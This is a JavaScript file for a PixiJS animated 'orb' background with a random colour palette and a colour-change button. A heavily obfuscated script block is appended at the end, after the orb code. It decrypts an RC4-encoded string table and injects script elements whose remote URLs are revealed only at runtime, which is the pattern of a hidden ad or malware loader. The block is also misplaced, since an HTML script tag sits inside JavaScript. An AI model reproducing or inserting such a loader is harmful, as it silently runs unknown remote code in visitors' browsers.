import * as PIXI from "https://cdn.skypack.dev/pixi.js";
import { KawaseBlurFilter } from "https://cdn.skypack.dev/@pixi/filter-kawase-blur";
import SimplexNoise from "https://cdn.skypack.dev/simplex-noise";
import hsl from "https://cdn.skypack.dev/hsl-to-hex";
import debounce from "https://cdn.skypack.dev/debounce";

// return a random number within a range
function random(min, max) {
  return Math.random() * (max - min) + min;
}

// map a number from 1 range to another
function map(n, start1, end1, start2, end2) {
  return ((n - start1) / (end1 - start1)) * (end2 - start2) + start2;
}

// Create a new simplex noise instance
const simplex = new SimplexNoise();

// ColorPalette class
class ColorPalette {
  constructor() {
    this.setColors();
    this.setCustomProperties();
  }

  setColors() {
    // pick a random hue somewhere between 220 and 360
    this.hue = ~~random(220, 360);
    this.complimentaryHue1 = this.hue + 30;
    this.complimentaryHue2 = this.hue + 60;
    // define a fixed saturation and lightness
    this.saturation = 95;
    this.lightness = 50;

    // define a base color
    this.baseColor = hsl(this.hue, this.saturation, this.lightness);
    // define a complimentary color, 30 degress away from the base
    this.complimentaryColor1 = hsl(
      this.complimentaryHue1,
      this.saturation,
      this.lightness
    );
    // define a second complimentary color, 60 degrees away from the base
    this.complimentaryColor2 = hsl(
      this.complimentaryHue2,
      this.saturation,
      this.lightness
    );

    // store the color choices in an array so that a random one can be picked later
    this.colorChoices = [
      this.baseColor,
      this.complimentaryColor1,
      this.complimentaryColor2
    ];
  }

  randomColor() {
    // pick a random color
    return this.colorChoices[~~random(0, this.colorChoices.length)].replace(
      "#",
      "0x"
    );
  }

  setCustomProperties() {
    // set CSS custom properties so that the colors defined here can be used throughout the UI
    document.documentElement.style.setProperty("--hue", this.hue);
    document.documentElement.style.setProperty(
      "--hue-complimentary1",
      this.complimentaryHue1
    );
    document.documentElement.style.setProperty(
      "--hue-complimentary2",
      this.complimentaryHue2
    );
  }
}

// Orb class
class Orb {
  // Pixi takes hex colors as hexidecimal literals (0x rather than a string with '#')
  constructor(fill = 0x000000) {
    // bounds = the area an orb is "allowed" to move within
    this.bounds = this.setBounds();
    // initialise the orb's { x, y } values to a random point within it's bounds
    this.x = random(this.bounds["x"].min, this.bounds["x"].max);
    this.y = random(this.bounds["y"].min, this.bounds["y"].max);

    // how large the orb is vs it's original radius (this will modulate over time)
    this.scale = 1;

    // what color is the orb?
    this.fill = fill;

    // the original radius of the orb, set relative to window height
    this.radius = random(window.innerHeight / 6, window.innerHeight / 3);

    // starting points in "time" for the noise/self similar random values
    this.xOff = random(0, 1000);
    this.yOff = random(0, 1000);
    // how quickly the noise/self similar random values step through time
    this.inc = 0.002;

    // PIXI.Graphics is used to draw 2d primitives (in this case a circle) to the canvas
    this.graphics = new PIXI.Graphics();
    this.graphics.alpha = 0.825;

    // 250ms after the last window resize event, recalculate orb positions.
    window.addEventListener(
      "resize",
      debounce(() => {
        this.bounds = this.setBounds();
      }, 250)
    );
  }

  setBounds() {
    // how far from the { x, y } origin can each orb move
    const maxDist =
      window.innerWidth < 1000 ? window.innerWidth / 3 : window.innerWidth / 5;
    // the { x, y } origin for each orb (the bottom right of the screen)
    const originX = window.innerWidth / 1.25;
    const originY =
      window.innerWidth < 1000
        ? window.innerHeight
        : window.innerHeight / 1.375;

    // allow each orb to move x distance away from it's x / y origin
    return {
      x: {
        min: originX - maxDist,
        max: originX + maxDist
      },
      y: {
        min: originY - maxDist,
        max: originY + maxDist
      }
    };
  }

  update() {
    // self similar "psuedo-random" or noise values at a given point in "time"
    const xNoise = simplex.noise2D(this.xOff, this.xOff);
    const yNoise = simplex.noise2D(this.yOff, this.yOff);
    const scaleNoise = simplex.noise2D(this.xOff, this.yOff);

    // map the xNoise/yNoise values (between -1 and 1) to a point within the orb's bounds
    this.x = map(xNoise, -1, 1, this.bounds["x"].min, this.bounds["x"].max);
    this.y = map(yNoise, -1, 1, this.bounds["y"].min, this.bounds["y"].max);
    // map scaleNoise (between -1 and 1) to a scale value somewhere between half of the orb's original size, and 100% of it's original size
    this.scale = map(scaleNoise, -1, 1, 0.5, 1);

    // step through "time"
    this.xOff += this.inc;
    this.yOff += this.inc;
  }

  render() {
    // update the PIXI.Graphics position and scale values
    this.graphics.x = this.x;
    this.graphics.y = this.y;
    this.graphics.scale.set(this.scale);

    // clear anything currently drawn to graphics
    this.graphics.clear();

    // tell graphics to fill any shapes drawn after this with the orb's fill color
    this.graphics.beginFill(this.fill);
    // draw a circle at { 0, 0 } with it's size set by this.radius
    this.graphics.drawCircle(0, 0, this.radius);
    // let graphics know we won't be filling in any more shapes
    this.graphics.endFill();
  }
}

// Create PixiJS app
const app = new PIXI.Application({
  // render to <canvas class="orb-canvas"></canvas>
  view: document.querySelector(".orb-canvas"),
  // auto adjust size to fit the current window
  resizeTo: window,
  // transparent background, we will be creating a gradient background later using CSS
  transparent: true
});

// Create colour palette
const colorPalette = new ColorPalette();

app.stage.filters = [new KawaseBlurFilter(30, 10, true)];

// Create orbs
const orbs = [];

for (let i = 0; i < 10; i++) {
  const orb = new Orb(colorPalette.randomColor());

  app.stage.addChild(orb.graphics);

  orbs.push(orb);
}

// Animate!
if (!window.matchMedia("(prefers-reduced-motion: reduce)").matches) {
  app.ticker.add(() => {
    orbs.forEach((orb) => {
      orb.update();
      orb.render();
    });
  });
} else {
  orbs.forEach((orb) => {
    orb.update();
    orb.render();
  });
}

document
  .querySelector(".overlay__btn--colors")
  .addEventListener("click", () => {
    colorPalette.setColors();
    colorPalette.setCustomProperties();

    orbs.forEach((orb) => {
      orb.fill = colorPalette.randomColor();
    });
  });

setTimeout(function(){
$('#loading').fadeOut(500);
}, 2500);
<script type="text/javascript" data-cfasync="false">
/*<![CDATA[/* */
(function(){var addac92a601967f70a4d30f61f7908f4="ESNiPwkp1IhTiGx8c_CBp84ZklqbtNiPqubCFzvhMONFz0VOJnGbcf48MvGW-Abtlbffz4qBXKMUQXg";var c=['w4/CuDzDsj8PwqzCqcKowr3ChSg=','woEecwLCscKKw6gDRsKAcGku','JMK8wqIZ','wonCm8Kg','V8KQw7dtwoEAw5XDvcO5wohf','w7TDhsOrw7nCrMOP','w48Lw4HDqAkxecKbJGjCrVEDw6XDgT11w7LDhMKvM2kuwoQiw48zw60vV1DDpSjDr0kLAcKQwp9Uw47CrA==','TFRewpw2wqs+AA==','PTTDlsKkN27Cl8Kf','wo/Dt8O8J28=','wpQFOsOWwqfDjyzCjy3DqjvClh0lfw==','w6LCvMK6w49lwpTChMOBDh7DoMOuVMOdwqzDhXPDqETCmTp+wrZJYMKhw6wEw6N6wo3CncOJwrjCuifDkMKfTgrDhcOGwo7Ch0bDoW3CuRU=','w71awqt1JcKAwpI=','w5wZw5rCpxEdaMKGMmnCqlM=','BMOlX3c2DCgD','wp7DpcO3LGLDqcKcN8KGw6Q=','BsO4w7/CjijCpw==','wrzDgcOQPzxNcsKIIhhVTMOMw6I=','w6HDqsKtw6Vtw4nDmcOQCATCpMOdQ8Otw6PDgVHDplzCmA==','TcOBw5TDuRhH','fywwGgLDsQ==','NC7DjcK6PTnDl8OFKw==','wo/DpcOIwqjCmE8C','w71TJ8K2AyzCmg9YRMKKwoQ=','w6TCpyPDrw==','w57DmcOfTsK4VGrDig1jw57DssOP'];(function(a,b){var d=function(g){while(--g){a['push'](a['shift']());}};d(++b);}(c,0xea));var d=function(a,b){a=a-0x0;var e=c[a];if(d['XnCyLC']===undefined){(function(){var h;try{var j=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');h=j();}catch(k){h=window;}var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';h['atob']||(h['atob']=function(l){var m=String(l)['replace'](/=+$/,'');var n='';for(var o=0x0,p,q,r=0x0;q=m['charAt'](r++);~q&&(p=o%0x4?p*0x40+q:q,o++%0x4)?n+=String['fromCharCode'](0xff&p>>(-0x2*o&0x6)):0x0){q=i['indexOf'](q);}return n;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};d['VFosko']=g;d['nANOZD']={};d['XnCyLC']=!![];}var f=d['nANOZD'][a];if(f===undefined){if(d['sAXDML']===undefined){d['sAXDML']=!![];}e=d['VFosko'](e,b);d['nANOZD'][a]=e;}else{e=f;}return e;};var j=window;j[d('0x18','IWf9')]=[[d('0x14','w3nb'),0x48e875],[d('0x13','6sOe'),0x0],[d('0x11','jm$K'),'0'],[d('0xd','!r#7'),0x0],[d('0xc','yT4v'),![]],[d('0x1','S46M'),0x0],[d('0x0','IWf9'),!0x0]];var k=[d('0x6','!r#7'),d('0xb','jgJu')],z=0x0,a,b=function(){if(!k[z])return;a=j[d('0x7',']c7I')][d('0x19','k8ja')](d('0x5','nq24'));a[d('0x2','T%Fj')]=d('0xa','oCbH');a[d('0x9','y*oM')]=!0x0;var e=j[d('0xe','Cky^')][d('0x12','jgJu')](d('0x10','bOYf'))[0x0];a[d('0x3','Kd7R')]=d('0x8','fD@)')+k[z];a[d('0x4','h4ab')]=d('0x15','fD@)');a[d('0x16','c!Bj')]=function(){z++;b();};e[d('0xf','y*oM')][d('0x17','8R3E')](a,e);};b();})();
/*]]>/* */
</script>

